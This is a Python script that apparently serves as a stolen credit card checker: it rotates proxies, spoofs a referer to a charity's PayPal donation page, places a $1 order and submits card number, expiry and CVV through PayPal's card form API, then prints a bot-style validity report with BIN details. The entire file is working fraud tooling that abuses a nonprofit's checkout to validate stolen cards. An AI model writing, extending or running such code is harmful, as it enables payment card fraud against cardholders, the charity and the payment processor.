import requests
import random
import json
import time
import base64
import re
from bs4 import BeautifulSoup
from datetime import datetime, timedelta


def paypal(username, numero, mes, ano, cvv): 
    proxies_file = "proxy.txt"
    inicio = time.time()

    # BIN CHECKER
    bin = numero[:6]
    b_data = requests.get(f"https://bins.antipublic.cc/bins/{bin}").json()

    pais = b_data['country_name']
    flag = b_data['country_flag']
    bank = b_data['bank']
    brand = b_data['brand']
    level = b_data['level']
    tipo = b_data['type']

    with open(proxies_file, "r") as f:
        proxy_list = [line.strip() for line in f if line.strip()]

    proxy_raw = random.choice(proxy_list)
    session = requests.Session()
    proxie = {
        "http": f"http://{proxy_raw}",
        "https": f"http://{proxy_raw}"
    }

    head = {
        "Host": "www.paypal.com",
        "referer": "https://onehealthworkforceacademies.org/",
    }

    r = session.post(
        "https://www.paypal.com/smart/buttons?client-id=sb&currency=USD&commit=false&intent=CAPTURE&enable-funding=venmo&disable-funding=paylater,card&components=buttons,funding-eligibility&integration-date=2022-05-05&buttonSessionID=xxxxx&buyer-country=US&locale=en_US&button_size=small&button_layout=vertical&button_variant=gold&button_shape=rect&button_label=paypal",
        headers=head
    )

    token = r.text
    match = re.search(r'"facilitatorAccessToken"\s*:\s*"([^"]+)"', token)
    token = match.group(1)
    print(token)

    head2 = {
        "content-type": "application/json",
        "authorization": f"Bearer {token}",
        "referer": "https://www.paypal.com/smart/buttons?client-id=sb&currency=USD&commit=false&intent=CAPTURE&enable-funding=venmo&disable-funding=paylater,card&components=buttons,funding-eligibility&integration-date=2022-05-05&buttonSessionID=xxxxx&buyer-country=US&locale=en_US&button_size=small&button_layout=vertical&button_variant=gold&button_shape=rect&button_label=paypal",
    }

    post2 = json.dumps({
        "purchase_units": [{
            "amount": {
                "currency_code": "USD",
                "value": "1",
                "breakdown": {
                    "item_total": {
                        "currency_code": "USD",
                        "value": "1"
                    }
                }
            },
            "items": [{
                "name": "item name",
                "unit_amount": {
                    "currency_code": "USD",
                    "value": "1"
                },
                "quantity": "1",
                "category": "DONATION"
            }],
            "description": "OHWA Donation"
        }],
        "intent": "CAPTURE",
        "application_context": {}
    })

    r2 = session.post("https://www.paypal.com/v2/checkout/orders", headers=head2, data=post2)
    id_response = r2.text
    match = re.search(r'"id"\s*:\s*"([^"]+)"', id_response)
    id_ = match.group(1)

    post3 = {
        "query": "mutation SubmitCreditCardPayment($token: String!, $card: CreditCardInput!, $email: EmailAddress, $phoneNumber: PhoneNumber, $billingAddress: BillingAddressInput!, $shippingAddress: ShippingAddressInput!, $firstName: String, $lastName: String, $currencyConversionType: CurrencyConversionType) { submitCreditCardPayment(token: $token, card: $card, email: $email, phoneNumber: $phoneNumber, billingAddress: $billingAddress, shippingAddress: $shippingAddress, firstName: $firstName, lastName: $lastName, currencyConversionType: $currencyConversionType) { paymentExperience { status reason instrumentType token } paymentMethod { id type status } message code } }",
        "variables": {
            "token": id_,
            "card": {
                "cardNumber": numero,
                "expirationDate": f"{mes}/{ano}",
                "postalCode": "10027",
                "securityCode": cvv,
            },
            "phoneNumber": "19006318646",
            "firstName": "Sachio",
            "lastName": "YT",
            "billingAddress": {
                "givenName": "Sachio",
                "familyName": "YT",
                "line1": "118 W 132nd St",
                "line2": None,
                "city": "New York",
                "state": "NY",
                "postalCode": "10027",
                "country": "US",
            },
            "shippingAddress": {
                "givenName": "Sachio",
                "familyName": "YT",
                "line1": "118 W 132nd St",
                "line2": None,
                "city": "New York",
                "state": "NY",
                "postalCode": "10027",
                "country": "US",
            },
            "email": "sachiopremiun@gmail.com",
            "currencyConversionType": "PAYPAL",
        },
        "operationName": None,
    }

    head3 = {
        "content-type": "application/json",
        "referer": f"https://www.paypal.com/smart/card-fields?token={id_}",
    }

    r3 = session.post("https://www.paypal.com/graphql?fetch_credit_form_submit", headers=head3, json=post3)
    t3 = r3.text

    match_msg = re.search(r'"message"\s*:\s*"([^"]+)"', t3)
    match_code = re.search(r'"code"\s*:\s*"([^"]+)"', t3)

    msg = match_msg.group(1) if match_msg else "No message"
    code = match_code.group(1) if match_code else "No code"

    end = time.time()
    tiempo = str(round(end - inicio, 2))

    return (
        f"⋄ ︱ <b>CC</b>: {numero}|{mes}|{ano}|{cvv}\n"
        f"⋄ ︱ <b>Status</b>: {msg}\n"
        f"⋄ ︱ <b>Response</b>: {code}\n"
        f"- - - - - - - - - - - - - - -\n"
        f"⋄ ︱ <b>Country</b>: {pais} - {flag}\n"
        f"⋄ ︱ <b>Bank</b>: {bank}\n"
        f"⋄ ︱ <b>Type</b>: {brand} - {level} - {tipo}\n"
        f"- - - - - - - - - - - - - - -\n"
        f"⋄ ︱ <b>Gate</b>: Stripe Auth\n"
        f"⋄ ︱ <b>Time</b>: {tiempo} seconds\n"
        f"⋄ ︱ <b>Checked By</b>: {username}\n"
    )